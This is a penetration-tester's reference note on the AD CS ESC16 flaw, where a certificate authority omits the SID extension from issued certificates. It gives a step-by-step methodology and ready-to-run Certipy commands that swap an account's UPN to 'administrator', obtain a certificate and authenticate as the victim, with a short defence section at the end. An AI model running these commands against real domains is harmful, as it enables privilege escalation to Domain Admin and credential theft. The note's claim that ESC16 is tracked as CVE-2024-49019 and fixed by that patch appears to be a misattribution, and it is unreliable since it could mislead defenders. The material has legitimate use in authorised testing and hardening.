---
title: "ADCS ESC16 - Security Extension Disabled"
type: technique
tags: [active-directory, adcs, certificate, privilege-escalation, esc16]
phase: exploitation
date_created: 2026-06-17
date_updated: 2026-06-17
sources: [specterops-esc16, certipy-wiki-privesc, hackingarticles-esc16]
---

# ADCS ESC16 - Security Extension Disabled

## What it is
ESC16 is an AD CS misconfiguration where the CA is configured to omit the SID security extension (szOID_NTDS_CA_SECURITY_EXT, OID 1.3.6.1.4.1.311.25.2) from every certificate it issues, globally, regardless of template settings. Without that extension the strong certificate-to-account binding enforced on Windows Server 2022+ (the post-CVE-2022-26931 hardening) is broken, re-enabling impersonation by certificate. Tracked as CVE-2024-49019.

## How it works
The SID security extension embeds the requester's objectSid into the issued certificate so the KDC can verify the certificate maps to the intended account. When the CA carries this OID in its globally disabled-extensions list (`DisableExtensionList` policy), issued certs contain no SID. An attacker who obtains a certificate with an attacker-influenced subject/UPN, or who alters the UPN of an account they control, can then authenticate as a different principal, because the KDC has no SID binding to contradict the UPN. This collapses ESC16 into an ESC9/ESC10-style UPN impersonation, but CA-wide rather than per-template.

## Attack phases
Exploitation and privilege escalation (domain escalation to Domain Admin or an arbitrary account).

## Prerequisites
- A CA with szOID_NTDS_CA_SECURITY_EXT in its disabled-extensions list (Certipy flags this as ESC16).
- Control of an account whose UPN you can write (for the UPN swap), or a template that lets you specify subject/SAN.
- Enrollment rights to any client-auth-capable template.
- Target not patched against CVE-2024-49019.

## Methodology
1. Enumerate: run Certipy and look for the ESC16 flag on the CA.
2. Record your controlled account's current UPN.
3. Set the controlled account's UPN to the victim (for example `administrator`).
4. Request a client-auth certificate; because the CA omits the SID extension, the cert binds only by UPN.
5. Restore your account's UPN so it does not conflict at authentication time.
6. Authenticate with the certificate as the victim (PKINIT) and obtain a TGT or NT hash.

## Key payloads / examples
Detect (Certipy):
```bash
certipy find -u user@corp.local -p 'Pass' -dc-ip 10.0.0.1 -stdout -vulnerable
# look for: ESC16  (Security Extension Disabled on the CA)
```
Exploit via UPN swap (Certipy):
```bash
# 1. set our account UPN to the victim
certipy account update -u user@corp.local -p 'Pass' -user controlled$ -upn administrator@corp.local
# 2. request a cert under a client-auth template (CA adds no SID extension)
certipy req -u controlled$@corp.local -p 'Pass' -ca CORP-CA -template User
# 3. restore our UPN
certipy account update -u user@corp.local -p 'Pass' -user controlled$ -upn controlled@corp.local
# 4. authenticate as the victim with the issued cert
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

## Bypasses and variants
- Sibling of ESC9 (no-security-extension on a template) and ESC10 (weak cert-mapping registry keys); ESC16 is the CA-global form. See [[active-directory-certificate-esc9]] and [[active-directory-certificate-esc-attacks]].
- Obtain the initial controlled principal via shadow credentials or machine-account-quota abuse.

## Detection and defence
- Patch CVE-2024-49019 (November 2024).
- Remove szOID_NTDS_CA_SECURITY_EXT from the CA disabled-extension list so the SID is always embedded; audit `certutil -getreg policy\DisableExtensionList`.
- Enforce strong certificate mapping on DCs (StrongCertificateBindingEnforcement = 2).
- Monitor issuance for certs missing the SID extension and for UPN changes on privileged-adjacent accounts.

## Tools
Certipy (ly4k), Certify (SpecterOps). See [[adcs]] and [[active-directory-certificate-esc-attacks]].

## Sources
- SpecterOps, "ESC16 - Security Extension Disabled on Certificate Authority" (slug: specterops-esc16).
- ly4k/Certipy wiki, Privilege Escalation (slug: certipy-wiki-privesc).
- Hacking Articles, "ADCS ESC16 - Security Extension Disabled on CA (Globally)" (slug: hackingarticles-esc16).
